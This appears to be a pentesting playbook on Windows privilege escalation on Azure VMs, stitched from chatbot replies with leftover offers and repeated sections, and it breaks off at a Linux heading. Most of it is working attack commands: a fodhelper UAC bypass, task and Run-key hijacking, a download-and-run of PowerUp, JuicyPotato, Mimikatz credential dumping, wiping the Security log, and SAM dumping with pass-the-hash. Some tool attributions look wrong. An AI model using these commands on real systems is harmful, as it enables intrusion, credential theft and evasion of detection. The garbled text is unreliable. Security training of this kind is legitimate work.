# Introduction

**What is Privilege Escalation?**

Privilege escalation is the process of gaining higher (usually
administrative or SYSTEM) privileges on a compromised system by
exploiting vulnerabilities, misconfigurations, or weak permissions.

# Summary

Privilege escalation on Azure Windows VMs leverages a mix of traditional
Windows weaknesses (services, scheduled tasks, UAC, ACLs) and kernel
exploits. Careful enumeration, combined with known exploit techniques,
enables an attacker to gain elevated access. Azure Defender, regular
patching, and strict permission controls are vital defenses.

## Windows Privilege Escalation

**1. Kernel Exploits**

- Exploiting vulnerable Windows kernel components or drivers to gain
  SYSTEM privileges.

- Less common on fully patched Azure VMs but important to check for
  unpatched vulnerabilities (e.g., using tools like Windows Exploit
  Suggester).

- Azure Defender often monitors kernel integrity, so stealth is
  critical.

**2. Bypass UAC (User Account Control)**

- Elevate privileges from a standard user to administrator without
  triggering UAC prompts.

- Techniques include exploiting auto-elevated processes, eventvwr.exe
  hijacking, or registry manipulation.

- On Azure VMs, these can allow privilege escalation without alerting
  defenders or triggering Azure security alerts.

**3. Unquoted Service Path Vulnerability**

- Services with unquoted executable paths containing spaces can be
  exploited by placing malicious executables in parent directories.

- On Azure Windows VMs, enumerating services (sc query or PowerShell
  Get-Service) helps identify such misconfigurations.

**4. Scheduled Task Abuse**

- Misconfigured scheduled tasks running with elevated privileges can be
  modified or hijacked to execute arbitrary code.

- Azure VMs often have scheduled tasks for maintenance or backup;
  checking permissions is key.

**5. Automated Scripts and Configurations**

- Scripts left on the VM (PowerShell, batch files) running with elevated
  rights can be abused or modified to execute malicious commands.

- Automated Azure VM management scripts sometimes have hardcoded
  credentials or insecure logic that can be exploited.

**Additional Azure Context & Recommendations:**

- **Azure VM Patching & Security Controls:** Keep VMs updated; Azure
  Security Center / Defender flags known vulnerabilities.

- **Role-Based Access Control (RBAC):** Privilege escalation on VMs
  complements Azure RBAC misconfigurations—check for privilege overlap.

- **Logging & Monitoring:** Use Azure Monitor and Defender logs to
  detect suspicious privilege escalation attempts.

- **Use Just-In-Time (JIT) VM Access:** Limits exposure and reduces
  attack surface for privilege escalation.

- **Least Privilege Principle:** Ensure users and services on Azure VMs
  run with minimal required privileges.

## Summary Table

| **Technique** | **Steps** | **Commands / Tools** | **Exploits / Payloads** |
|----|----|----|----|
| Logon Autostart Execution | Enumerate/add Run keys, install MSI, startup folder | PowerShell, msiexec | Malicious MSI, persistent payload |
| Password Hunting | Search registry, brute force, extract creds | reg query, mimikatz, CrackMapExec | Mimikatz credential dumps |
| ACL Bypass | Use SeBackup/SeRestore, token impersonation | PowerUp, JuicyPotato, RottenPotato | Juicy Potato, PrintSpoofer exploits |

# Key Privileges, Abuse Techniques, and Impact

Windows privileges control critical system functions and Active
Directory (AD) operations. Attackers who gain certain privileges can
escalate rights, persist, pivot, or fully compromise the domain.

Many of these privileges are commonly abused during penetration tests
and red team engagements. Understanding, detecting, and exploiting these
privileges helps uncover security weaknesses in Windows environments and
Active Directory infrastructures.

| **Privilege** | **Abuse Techniques & Pentest Tactics** | **Tools & Commands** | **Vulnerabilities/Abuse Vectors** | **Risk Severity** | **Impact on Workload** |
|----|----|----|----|----|----|
| **SeDebugPrivilege** | Debug/inspect processes, bypass security descriptors to access all processes | Invoke-PrivilegeEscalation, Mimikatz, NtOpenProcess | Privilege escalation, credential theft | Critical | High (full control over processes) |
| **SeImpersonatePrivilege** | Impersonate tokens of other users/processes | Invoke-TokenManipulation, Mimikatz Invoke-TokenKidnap | Lateral movement, delegation abuse | Critical | High (full impersonation ability) |
| **SeTakeOwnershipPrivilege** | Take ownership of files/objects to escalate privileges or access sensitive data | takeown, icacls | Unauthorized access, privilege escalation | High | Medium (access control bypass) |
| **SeBackupPrivilege / SeRestorePrivilege** | Backup or restore files ignoring ACLs, steal sensitive data or overwrite for persistence | ntbackup, wbadmin, robocopy | Data exfiltration, persistence | High | Medium to High (data access/bypass) |
| **SeAssignPrimaryTokenPrivilege** | Replace process tokens to escalate privileges | Token impersonation with custom tokens | Privilege escalation | High | Medium |
| **SeEnableDelegationPrivilege** | Delegate credentials for lateral movement or Kerberos delegation attacks | Mimikatz kerberos::golden, Rubeus | Credential theft, lateral movement | Critical | High (domain compromise potential) |
| **SeRemoteShutdownPrivilege** | Remotely shutdown/reboot systems | shutdown /m \\target /r | Denial of Service (DoS) | Medium | High (service disruption) |
| **SeSystemEnvironmentPrivilege** | Modify firmware variables (rarely abused but critical) | N/A | Firmware-level persistence (rare) | High | Low |
| **SeCreateSymbolicLinkPrivilege** | Create symbolic links to bypass file protections | mklink | Bypass security controls | Medium | Low |
| **SeSecurityPrivilege** | Access and clear security logs to cover tracks | wevtutil, Mimikatz sekurlsa::logonpasswords | Log tampering | Critical | High (evade detection) |
| **SeShutdownPrivilege** | Shutdown local systems | shutdown /s | Denial of Service (DoS) | Medium | High (service disruption) |
| **SeIncreaseQuotaPrivilege** | Adjust memory quotas for processes to evade defenses | N/A | Evade resource-based defenses | Low | Low |
| **SeLoadDriverPrivilege** | Load/unload kernel drivers (rootkit installation) | Custom driver loaders | Kernel-level persistence | Critical | High |

**3. Common Tools Used in Privilege Abuse & AD Pentesting**

- **Mimikatz:** Extract credentials, abuse SeDebugPrivilege, impersonate
  tokens, create golden tickets.

- **PowerView / BloodHound:** Enumerate privileges, detect delegation
  abuse, identify high-value targets.

- **Rubeus:** Kerberos abuse, delegation, ticket forging.

- **SharpHound:** Collect AD info for privilege escalation and lateral
  movement.

- **Impacket:** Execute remote commands and privilege escalation tools.

- **PsExec / WinRM:** Remote command execution leveraging privilege
  abuse.

**4. Typical Vulnerabilities Exploited**

- Excessive privileges granted by default or through misconfiguration
  (e.g., local admins having SeDebugPrivilege).

- Weak or absent delegation controls (SeEnableDelegationPrivilege).

- Improper ACLs allowing take ownership or backup privilege abuse.

- Unrestricted symbolic link creation used to bypass file system
  protections.

- Security log manipulation via SeSecurityPrivilege.

- Missing monitoring/detection on privilege abuse activities.

**5. Security Risk Severity and Impact**

- Privileges like **SeDebugPrivilege**, **SeImpersonatePrivilege**,
  **SeEnableDelegationPrivilege**, and **SeSecurityPrivilege** pose
  **Critical** risks due to their potential to lead to full domain
  compromise and stealthy persistence.

- Privileges like **SeBackupPrivilege**, **SeRestorePrivilege**, and
  **SeTakeOwnershipPrivilege** pose **High** risks enabling data
  exfiltration and unauthorized access.

- Others like **SeShutdownPrivilege** and
  **SeCreateSymbolicLinkPrivilege** pose **Medium** risk mostly for DoS
  or bypass techniques.

Impact ranges from local privilege escalation, lateral movement,
credential theft, data exfiltration, to complete domain takeover and
stealthy persistence.

**6. Penetration Testing Steps & Commands**

**Step 1: Enumerate Privileges of Current User / Process**

whoami /priv

or using PowerShell:

Get-Privilege -List

**Step 2: Enumerate Users with Dangerous Privileges in AD**

Using PowerView:

Get-ADUser -Filter \* -Properties userAccountControl, memberOf,
privileges \|

Where-Object { \$\_.privileges -contains "SeDebugPrivilege" }

Or BloodHound (SharpHound) to visualize privilege assignments.

**Step 3: Abuse SeDebugPrivilege to Extract Credentials**

Using Mimikatz on a compromised host with debug rights:

privilege::debug

sekurlsa::logonpasswords

**Step 4: Impersonate Tokens (SeImpersonatePrivilege)**

Use Mimikatz or PowerShell to impersonate tokens:

Invoke-TokenManipulation -ImpersonateUser Administrator

**Step 5: Use SeBackupPrivilege to Copy Sensitive Files**

wbadmin start backup -backuptarget:D: -include:C: -quiet

Or robocopy with backup mode:

robocopy C:\SensitiveFolder D:\BackupFolder /B /E

**Step 6: Exploit Delegation Abuse (SeEnableDelegationPrivilege)**

Use Rubeus for Kerberos ticket attacks:

rubeus.exe asktgt /user:username /password:password /nowrap

rubeus.exe ptt /ticket:\<ticket\>

**Step 7: Cleanup Security Logs (SeSecurityPrivilege)**

wevtutil cl Security

**Step 8: Additional Enumeration & Persistence**

- Create symbolic links to bypass ACLs.

- Load custom drivers (if permitted) to maintain kernel-level
  persistence.

**7. Mitigations & Defense Strategies**

- Limit assignment of powerful privileges (especially SeDebug,
  SeImpersonate, SeEnableDelegation) to trusted admins only.

- Use **Group Policy** and **Restricted Groups** to enforce least
  privilege.

- Enable **Event Logging** and **Security Monitoring** for privilege
  abuse activities.

- Harden delegation settings in AD (disable unconstrained delegation).

- Regularly audit whoami /priv and AD group memberships.

- Use tools like **BloodHound** for privilege graph analysis and
  continuous monitoring.

- Apply **Patch Management** and **Driver Signing** policies to prevent
  unauthorized driver loads.

If you want, I can generate detailed command scripts or BloodHound
queries for privilege enumeration and exploitation. Would you like that?

# Scheduled Task Abuse

**What:** Misconfigured scheduled tasks running with elevated privileges
can be modified or hijacked.\
**Steps & Commands:**

- Enumerate scheduled tasks:

- schtasks /query /fo LIST /v

- Get-ScheduledTask \| Where-Object { \$\_.Principal.RunLevel -eq
  'Highest' }

- Check permissions on task XML or action executable.

- Modify a task to run malicious payload:

- schtasks /change /tn "TaskName" /tr "C:\path\malicious.exe"

- schtasks /run /tn "TaskName"

**Exploitation:** Inject payload to gain SYSTEM privileges when task
runs.

## Scheduled Tasks Exploitation

**Overview**

Scheduled Tasks in Windows can run with elevated privileges.
Misconfigurations or weak permissions on tasks/jobs allow attackers to
hijack or modify them to execute malicious code with higher privileges.

**Key Concepts**

- **Task Scheduler:** Windows service managing scheduled tasks.

- **Misconfigured Scheduled Task:** Tasks with overly permissive ACLs or
  running under SYSTEM/admin accounts without proper security.

- **Abusing Scheduled Task:** Modifying task actions or creating new
  tasks to execute payloads as privileged users.

**Steps & Commands**

1.  **Enumerate Scheduled Tasks:**

schtasks /query /fo LIST /v

Get-ScheduledTask \| Where-Object { \$\_.Principal.RunLevel -eq
'Highest' }

2.  **Check Permissions on Tasks:**

- Inspect ACLs on task XML files (typically in
  C:\Windows\System32\Tasks)

Get-Acl "C:\Windows\System32\Tasks\TaskName" \| Format-List

3.  **Modify or Create Malicious Task:**

- Change existing task to run your payload:

schtasks /change /tn "TaskName" /tr "C:\path\malicious.exe"

schtasks /run /tn "TaskName"

- Or create a new task with SYSTEM privileges:

schtasks /create /tn "MaliciousTask" /tr "C:\path\malicious.exe" /sc
once /st 00:00 /ru SYSTEM

schtasks /run /tn "MaliciousTask"

**Detection & Mitigation**

- Regularly audit scheduled tasks and their ACLs.

- Limit who can create or modify tasks.

- Monitor creation/modification of tasks via Windows Event Logs and
  Azure Defender.

- Use Azure Policy to enforce security controls on VMs.

## 4. Scheduled Task Abuse

**Detection:**

- List scheduled tasks and their permissions:

schtasks /query /fo LIST /v

\# or PowerShell:

Get-ScheduledTask \| Where-Object { \$\_.Principal.RunLevel -eq
"Highest" }

- Check if tasks can be modified or hijacked (write permissions on XML
  or executable).

**Exploitation:**

- Modify task action to execute a payload:

schtasks /change /tn "TaskName" /tr "C:\path\to\malicious.exe"

schtasks /run /tn "TaskName"

# Bypass ACL (Access Control List)

Attackers leverage special privileges or techniques to bypass
file/registry permissions to access or modify restricted objects.

**Key Privileges & Techniques**

**a. SeBackupPrivilege & SeRestorePrivilege**

- Allow reading or writing files regardless of ACLs if the user has
  these privileges.

- Use mimikatz or PowerShell scripts (e.g., PowerUp.ps1) to exploit:

- Invoke-Expression (Invoke-WebRequest -Uri
  https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1).Content

- Get-Privilege -Name SeBackupPrivilege

- Copy files with robocopy or ntbackup bypassing ACLs.

**b. Token Impersonation (Hot Potato / Rotten Potato / Juicy Potato /
PrintSpoofer)**

- Exploits abusing vulnerable RPC or service tokens to impersonate
  SYSTEM.

- Popular tools:

  - [Juicy Potato](https://github.com/ohpe/juicy-potato)

  - [Rotten Potato](https://github.com/bitsadmin/RottenPotatoNG)

  - [PrintSpoofer](https://github.com/itm4n/PrintSpoofer)

- Run exploit to spawn SYSTEM shell:

- JuicyPotato.exe -l 1337 -p "C:\Windows\System32\cmd.exe" -t \* -c

**c. Hive Nightmare**

- Exploit registry hive permissions to dump or modify SYSTEM hives.

- Use mimikatz or specialized scripts to read SYSTEM, SAM hives with
  backup privileges.

**RBAC Weakness & Service Exploitation**

**Key Attack Vectors**

- **Insecure Service Properties:** Services with weak ACLs or
  misconfigured settings.

- **Unquoted Service Path:** Services with unquoted executable paths
  containing spaces, leading to executable hijacking.

- **Weak Registry Permissions:** Registry keys controlling services or
  autostart with improper permissions.

- **Insecure Service Executables:** Vulnerable or outdated binaries
  running as services.

- **Insecure GUI Apps / Bypass UAC:** Auto-elevated apps that can be
  abused to bypass User Account Control.

**Steps & Commands**

1.  **Find Services with Unquoted Paths:**

Get-WmiObject win32_service \| Where-Object { \$\_.PathName -match ' '
-and \$\_.PathName -notmatch '^".\*"\$' } \| Select Name, PathName

2.  **Check Permissions on Service Executables and Registry:**

Get-Acl "C:\Path\To\Service.exe" \| Format-List

Get-Acl "HKLM:\SYSTEM\CurrentControlSet\Services\ServiceName" \|
Format-List

3.  **Exploit Unquoted Path:**

- Place malicious executable in the parent folder of the service binary
  path, so it gets executed with service privileges on service restart.

4.  **UAC Bypass Example:**

reg add HKCU\Software\Classes\ms-settings\shell\open\command /ve /d
"powershell.exe -c Start-Process cmd -Verb runAs" /f

Start-Process fodhelper.exe

**Detection & Mitigation**

- Patch and update service executables regularly.

- Quote all service paths correctly.

- Harden service and registry ACLs.

- Monitor service creation/modification events.

- Employ Azure Defender’s endpoint protection for process monitoring.

## Bypass UAC

**What:** Elevate privileges from a standard user to admin without
triggering UAC prompts.\
**Steps & Commands:**

- Enumerate UAC settings:

- Get-ItemProperty
  "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"
  -Name ConsentPromptBehaviorAdmin

- Exploit known auto-elevated executables (e.g., fodhelper.exe,
  eventvwr.exe):

- reg add HKCU\Software\Classes\ms-settings\shell\open\command /ve /d
  "powershell.exe -c Start-Process cmd -Verb runAs" /f

- Start-Process fodhelper.exe

**MITRE ATT&CK Context**

- Privilege escalation techniques are broadly covered under **MITRE
  ATT&CK T1547 (Boot or Logon Autostart Execution)** and others like
  **T1055 (Process Injection), T1068 (Exploitation for Privilege
  Escalation)**.

- Understanding these helps in both offensive and defensive security in
  Azure environments.

## ACL (Access Control List) Bypass

**What:** Bypass file or registry permissions using privileges like
SeBackupPrivilege or token impersonation.\
**Steps & Commands:**

- Enumerate ACLs on sensitive files:

- Get-Acl C:\Windows\System32\config\SAM \| Format-List

- Use tools like
  [SharpHound](https://github.com/BloodHoundAD/SharpHound) or
  [PowerUp](https://github.com/PowerShellMafia/PowerSploit) to check for
  ACL weaknesses.

- Exploit with token impersonation or hive dumping (Hive Nightmare).

## 2. Bypass UAC

**Detection:**

- Check UAC level:

Get-ItemProperty -Path
"HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name
ConsentPromptBehaviorAdmin

- Enumerate auto-elevated binaries and vulnerable registry keys:

\# List auto-elevated executables:

Get-ChildItem "C:\Windows\System32" \| Where-Object { \$\_.Name -match
"eventvwr.exe\|fodhelper.exe\|sdclt.exe" }

**Exploitation:**

- Use fodhelper.exe to bypass UAC (example):

\# Create a registry key for malicious payload

reg add HKCU\Software\Classes\ms-settings\shell\open\command /ve /d
"powershell.exe -c Start-Process cmd -Verb runAs" /f

\# Run fodhelper.exe

Start-Process fodhelper.exe

- Tools like [UACMe](https://github.com/hfiref0x/UACMe) automate many
  bypass techniques.

# Unquoted Service Path

**Detection:**

- List services with unquoted paths:

Get-WmiObject win32_service \| Where-Object { \$\_.PathName -and
\$\_.PathName -match ' ' -and \$\_.PathName -notmatch '^".\*"\$' } \|
Select Name, PathName

**Exploitation:**

- If path is like C:\Program Files\SomeService\service.exe unquoted,
  place a malicious executable named C:\Program.exe or C:\Program
  Files\SomeService\malicious.exe to get executed with service
  privileges.

- Upload or create payload in parent directory, then restart the
  service.

## Weak Services (Unquoted Service Path, Weak Permissions)

**What:** Services with unquoted paths or weak ACLs can be hijacked to
execute attacker-controlled code.\
**Steps & Commands:**

- Find unquoted service paths:

- Get-WmiObject win32_service \| Where-Object { \$\_.PathName -match ' '
  -and \$\_.PathName -notmatch '^".\*"\$' } \| Select Name, PathName

- Check service binary folder permissions for write access.

- Exploit by placing malicious executable in the path and restarting the
  service.

# Kernel Exploits

**What:** Exploiting Windows kernel vulnerabilities to gain SYSTEM
access.\
**Steps & Commands:**

- Check OS version and patch level:

- systeminfo \| findstr /B /C:"OS Version"

- Use tools like Windows Exploit Suggester to identify applicable kernel
  exploits.

- Exploit known vulnerabilities (e.g., PrintNightmare CVE-2021-1675)
  with care.\
  **Note:** Azure regularly patches VMs, so kernel exploits may be rare
  but still worth checking.

**What is Kernel?**

- The Windows kernel is the core of the OS, managing system resources,
  hardware communication, and privilege separation.

- Exploiting kernel vulnerabilities can give attackers SYSTEM-level
  privileges and full control.

**Pentest Steps**

1.  **Enumerate OS Version & Patch Level:**

systeminfo \| findstr /B /C:"OS Version"

2.  **Identify Missing Patches & Known Vulnerabilities:**

- Use tools like [Windows Exploit
  Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
  with a local CVE database.

- Alternatively, use winver or security bulletin checks.

3.  **Compiling & Using Kernel Exploits:**

- Download exploit source code (often C or C++).

- Compile with Visual Studio or GCC cross-compiler if available.

- Run exploit carefully in lab environment only.

- Example exploits include PrintNightmare (CVE-2021-1675), Zerologon, or
  older local privilege escalation kernels.

## 1. Kernel Exploits

**Detection:**

- Check OS version and patch level:

systeminfo \| findstr /B /C:"OS Version"

- Enumerate possible kernel exploits with [Windows Exploit
  Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
  (requires offline CVE database):

\# Export system info:

systeminfo \> systeminfo.txt

\# Use exploit suggester to find applicable kernel exploits

**Exploitation:**

- Use public exploits like **CVE-2021-1675 (PrintNightmare)** if
  unpatched (test carefully in lab).

- Use tools such as Exploit-DB payloads or Metasploit modules.

# Logon Autostart Execution

Attackers abuse Windows features that automatically run programs at user
logon or system startup to gain persistence or escalate privileges.

**Key Vectors & Steps**

**a. Run Registry Key**

- Registry keys under these paths launch executables at logon:

  - HKLM\Software\Microsoft\Windows\CurrentVersion\Run (all users)

  - HKCU\Software\Microsoft\Windows\CurrentVersion\Run (current user)

- **Enumerate:**

- Get-ItemProperty -Path
  HKLM:\Software\Microsoft\Windows\CurrentVersion\Run

- Get-ItemProperty -Path
  HKCU:\Software\Microsoft\Windows\CurrentVersion\Run

- **Exploit:** Add a malicious executable or script to run at next
  logon:

- Set-ItemProperty -Path
  HKCU:\Software\Microsoft\Windows\CurrentVersion\Run -Name
  "MaliciousTask" -Value "C:\path\malicious.exe"

**b. Always Install Elevated**

- Windows Installer can be configured to always run with elevated
  privileges.

- Check these registry keys:

- Get-ItemProperty -Path
  HKLM:\Software\Policies\Microsoft\Windows\Installer -Name
  AlwaysInstallElevated

- Get-ItemProperty -Path
  HKCU:\Software\Policies\Microsoft\Windows\Installer -Name
  AlwaysInstallElevated

- If set to 1, malicious MSI packages can be installed with SYSTEM
  privileges.

- **Exploit:** Create a malicious MSI and install it with elevated
  rights:

- msiexec /quiet /i malicious.msi

**c. Startup Folder**

- Executables or shortcuts placed in user or all users startup folders
  run at login.

- Locations:

  - %APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup (current
    user)

  - %ProgramData%\Microsoft\Windows\Start Menu\Programs\Startup (all
    users)

- **Add payload:**

- Copy-Item "C:\path\malicious.exe"
  "\$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\\

**Logon AutoStart Execution (Persistence & Escalation)**

**What:** Using registry Run keys or startup folders to execute code
with higher privileges at logon.\
**Steps & Commands:**

- Enumerate auto-start registry keys:

- Get-ItemProperty -Path
  HKLM:\Software\Microsoft\Windows\CurrentVersion\Run

- Get-ItemProperty -Path
  HKCU:\Software\Microsoft\Windows\CurrentVersion\Run

- Check Startup folder contents:

- Get-ChildItem "\$env:APPDATA\Microsoft\Windows\Start
  Menu\Programs\Startup"

- Add malicious entries to escalate privileges.

# Password Hunting

**What:** Searching for stored plaintext or hashed credentials in files,
registry, or memory.\
**Steps & Commands:**

- Search for passwords in files and scripts:

- Select-String -Path C:\\ -Pattern "password","pass","cred" -Recurse
  -ErrorAction SilentlyContinue

- Dump credentials with tools like mimikatz.

- Brute force local accounts if applicable.

## Password Hunting

Attackers search for stored credentials or weak passwords to escalate
privileges or move laterally.

**Vectors & Steps**

**a. Registry**

- Search for plaintext passwords or hashes stored in registry keys by
  misconfigured apps or services.

- Example:

- reg query HKLM /f "password" /s

- reg query HKCU /f "password" /s

**b. Brute Force**

- Attack local or remote accounts with brute force or password spraying
  tools like Hydra or CrackMapExec.

- Example (CrackMapExec):

- crackmapexec smb \<target-ip\> -u \<user\> -p \<password-list.txt\>

**c. Credential Manager (Run As)**

- Extract stored credentials used by RunAs or Windows Credential
  Manager.

- Tools: [Mimikatz](https://github.com/gentilkiwi/mimikatz) vault::list,
  sekurlsa::logonpasswords

- Example:

- mimikatz \# vault::list

- mimikatz \# sekurlsa::logonpasswords

**d. Configuration Files**

- Look for application config files or scripts with embedded
  credentials.

- Use recursive search:

- Select-String -Path C:\\ -Pattern "password","pwd","credential"
  -Recurse -ErrorAction SilentlyContinue

# Detection & Mitigation Recommendations

- Regular patching (especially kernel and service vulnerabilities).

- Use **Azure Defender for Servers** to monitor privilege escalation
  patterns.

- Enforce **least privilege principle** and restrict scheduled task
  permissions.

- Harden services: quote service paths, lock down ACLs.

- Monitor registry and startup entries for unauthorized changes.

- Enforce strong password policies and avoid storing plaintext
  credentials.

- Enable Just-In-Time (JIT) VM access to limit exposure.

- Audit ACL permissions regularly with PowerShell scripts or Azure
  Policy.

<!-- -->

- Azure regularly patches VMs with critical kernel fixes. Always keep
  your VM updated.

- Use Azure Defender for Servers to detect suspicious kernel-level
  activity.

- Employ Endpoint Detection and Response (EDR) tools.

- Restrict administrative access and use Just-In-Time (JIT) VM access.

- Monitor registry changes and autostart locations with Azure Defender
  for Endpoint.

- Disable “Always Install Elevated” via Group Policy.

- Enforce strong password policies and account lockout.

- Use LAPS or Azure AD Password Protection to limit brute force success.

- Regularly audit and harden ACLs, and restrict SeBackup/SeRestore
  privileges.

- Monitor token impersonation attempts via security event logs and Azure
  Sentinel.

Summary Table

| **Technique** | **Pentest Steps** | **Commands / Tools** | **Exploits / Payloads** |
|----|----|----|----|
| Scheduled Tasks | Enumerate, check ACL, modify/create tasks | schtasks, PowerShell Get-ScheduledTask | Malicious executable injection |
| RBAC Weakness / Services | Find unquoted paths, check ACL, exploit UAC | Get-WmiObject, Get-Acl, Registry edits | Unquoted path payload, UAC bypass |
| Kernel Exploits | Enumerate patch level, find exploits, compile | systeminfo, Windows Exploit Suggester | PrintNightmare, custom kernel exploits |

# Automated Scripts and Configurations

**Detection:**

- Search for scheduled PowerShell or batch scripts running as admin:

Get-ScheduledTask \| Where-Object { \$\_.Actions -match
'\\ps1\|\\bat\|\\cmd' }

- Look for hardcoded credentials or clear-text secrets in scripts:

Select-String -Path "C:\path\to\scripts\\" -Pattern
"password\|cred\|key"

**Exploitation:**

- Modify or replace scripts to execute reverse shell or elevate
  privileges.

- Example: add payload to scheduled PowerShell script.

**Bonus: Useful Tools for Azure Windows VM Pentesting**

- **PowerUp.ps1**: Automated privilege escalation checks ([PowerUp
  GitHub](https://github.com/PowerShellMafia/PowerSploit))

- **SharpUp**: C# compiled version of PowerUp for stealth and automation

- **Seatbelt**: Comprehensive Windows security auditing tool

- **BloodHound** (AzureHound for Azure AD): For AD and hybrid identity
  enumeration related to privilege escalation paths

# Exploit **SeBackupPrivilege** on an **Azure Windows VM**

This specific privilege escalation is based on the act of assigning a
user SeBackupPrivilege. It was designed for allowing users to create
backup copies of the system. Since it is not possible to make a backup
of something that you cannot read. This privilege comes at the cost of
providing the user with full read access to the file system. This
privilege must bypass any ACL that the Administrator has placed in the
network. So, in a nutshell, this privilege allows the user to read any
file on the entirety of the files that might also include some sensitive
files such as the SAM file or SYSTEM Registry file. From the attacker’s
perspective, this can be exploited after gaining the initial foothold in
the system and then moving up to an elevated shell by essentially
reading the SAM files and possibly crack the passwords of the high
privilege users on the system or network. This article will help you set
up the privilege in a VM environment to learn and explore it in detail
and then exploit it via Kali Linux.

## Setting Up Privilege on Windows 10

We will be performing this demonstration on a Windows 10 machine that is
quite essential not part of a domain. Here, we need to create a user to
which we will be providing the privilege. Creating a user is simple, it
can be done using a new user command as shown in the image below.

net user aarti 123 /add

The user creating can be verified by just running the net user command
without any options. Now, to create a realistic scenario, we need to
enable the WinRM. Since we are going to attack this machine through the
Kali Linux and when trying to exploit a Windows Machine that is an
access that we preferably end up with, we are going to active it. This
can be done by opening PowerShell and Enabling the PSRemoting option.
Although it is required to set the permissions to run scripts to bypass
as demonstrated below.

powershell -ep bypass

Enable-PSRemoting -Force

Till now, we have created a user and then enabled WinRM on the Target
machine. Now for the most important step. We need to provide the
privilege to the newly created user. We will be using a Module Named
Carbon. Firstly, we need to install the module and then import its
objects into the session using the Import-Module option.

Install-Module -Name carbon

Import-Module carbon

**🔐 Objective:**

Exploit SeBackupPrivilege on an **Azure Windows VM** using a
low-privileged user to dump and extract credentials from the SAM
database.

------------------------------------------------------------------------

**🧰 Environment Setup**

- **Target VM**: Azure Windows 10/Server VM *(not domain-joined)*

- **Attacker**: Kali Linux using evil-winrm

- **User created**: aarti with SeBackupPrivilege

------------------------------------------------------------------------

**⚙️ Preparation on Azure Windows VM**

**1. ✅ Create a new user:**

Run in an admin PowerShell session:

net user aarti 123 /add

**2. ✅ Enable WinRM (for remote shell access):**

powershell -ep bypass

Enable-PSRemoting -Force

Ensure the VM NSG allows inbound TCP on port 5985.

**3. ✅ Install and Import Carbon Module (adds SeBackupPrivilege):**

Install-Module -Name Carbon -Force

Import-Module Carbon

If PSGallery is not trusted, run:

Set-PSRepository -Name PSGallery -InstallationPolicy Trusted

**4. ✅ Assign SeBackupPrivilege to the user:**

Grant-CPrivilege -Identity aarti -Privilege SeBackupPrivilege

Test-CPrivilege -Identity aarti -Privilege SeBackupPrivilege

Result should return: True

------------------------------------------------------------------------

**🎯 Exploitation from Kali Linux**

**1. ✅ Connect to the Windows VM via Evil-WinRM:**

evil-winrm -i \<VM_IP\> -u aarti -p 123

------------------------------------------------------------------------

**2. ✅ Use SeBackupPrivilege to read SYSTEM and SAM:**

You can copy these critical files using volume shadow copies or RawCopy.

**Option A: Use RawCopy.exe (recommended for minimal tool footprint)**

1.  Upload RawCopy.exe to target via evil-winrm:

upload RawCopy.exe

2.  Create dump directory and copy hives:

mkdir C:\temp

.\RawCopy.exe /FileName:C:\Windows\System32\config\SAM
/OutputPath:C:\temp\SAM /Overwrite

.\RawCopy.exe /FileName:C:\Windows\System32\config\SYSTEM
/OutputPath:C:\temp\SYSTEM /Overwrite

3.  Download the files:

download C:\temp\SAM

download C:\temp\SYSTEM

------------------------------------------------------------------------

**3. ✅ Extract Hashes on Kali:**

secretsdump.py -sam SAM -system SYSTEM LOCAL

You’ll get NTLM hashes of local users (including Administrator).

------------------------------------------------------------------------

**4. 🛠️ Crack the hash or pass-the-hash:**

**Crack with Hashcat (if weak passwords):**

hashcat -m 1000 -a 0 hash.txt /usr/share/wordlists/rockyou.txt

**Or use pth-winexe for pass-the-hash shell:**

pth-winexe -U 'Administrator%\<NTLM_HASH\>' //\<target\> cmd.exe

------------------------------------------------------------------------

**🧯 Detection and Mitigation in Azure:**

| **🔎 Detection** | **🛡️ Mitigation** |
|----|----|
| Microsoft Defender for Endpoint alerts on RawCopy.exe usage or shadow volume access | Restrict SeBackupPrivilege to backup operators only |
| Azure Log Analytics with custom KQL to detect privilege assignment | Monitor WinRM usage and block IPs not in allowlist |
| Audit SeBackupPrivilege via GPO or Defender for Cloud | Disable WinRM if not used; enforce Just-in-Time VM access |

------------------------------------------------------------------------

**✅ Summary**

- SeBackupPrivilege bypasses ACLs—critical for offline hash extraction.

- Azure VMs with WinRM open and misconfigured privilege assignments are
  at risk.

- This method works *without full Administrator* if SeBackupPrivilege is
  assigned.

- Great for post-exploitation and lateral movement within the Azure VM
  context.

------------------------------------------------------------------------

Would you like a PowerShell script to automate the privilege assignment
and shadow copy creation?

Certainly! Here’s a polished, corrected, and comprehensive version of
your **Privilege Escalation for Azure Cloud Penetration Testing**
section, covering both Windows and Linux Azure VMs, with clear technical
accuracy and professional tone:

------------------------------------------------------------------------

**Privilege Escalation in Azure VM Penetration Testing**

**Windows and Linux**

------------------------------------------------------------------------

**Overview**

After successfully compromising an Azure Virtual Machine (VM), whether
running Windows or Linux, attackers typically gain a **limited,
low-privileged shell** (such as a basic command shell or a Meterpreter
session). This initial access often restricts their ability to perform
critical actions that require elevated privileges.

**Privilege escalation** is the essential next phase where attackers
enumerate and exploit system weaknesses to elevate their
permissions—ideally to administrative or root-level access—allowing full
control over the VM and its resources.

------------------------------------------------------------------------

**Privilege Escalation on Windows Azure VMs**

When attacking a Windows VM, the initial shell is generally restricted,
limiting the attacker’s ability to execute certain commands or access
sensitive areas.

- **Objective:** Escalate privileges from a limited user to SYSTEM or
  Administrator.

- **Key activities include:**

  - Enumerating system information, such as OS version, installed
    software, and patch levels.

  - Analyzing permissions on files, folders, and registry keys to find
    misconfigurations.

  - Reviewing Windows Event Logs and SAM (Security Account Manager)
    files for sensitive data or password hashes.

  - Identifying vulnerable services or scheduled tasks running with
    higher privileges.

  - Searching for plaintext passwords or credentials stored in
    configuration files or memory.

  - Exploiting known Windows privilege escalation vulnerabilities (e.g.,
    unquoted service paths, weak DACLs, or privilege escalation exploits
    like Rotten Potato).

Due to the vast number of files and registry entries in Windows,
**manual enumeration is tedious and error-prone**. Automating these
tasks with scripts (such as PowerUp, Sherlock, or custom PowerShell
scripts) significantly improves efficiency and accuracy in identifying
escalation vectors.

------------------------------------------------------------------------

**Privilege Escalation on Linux Azure VMs**

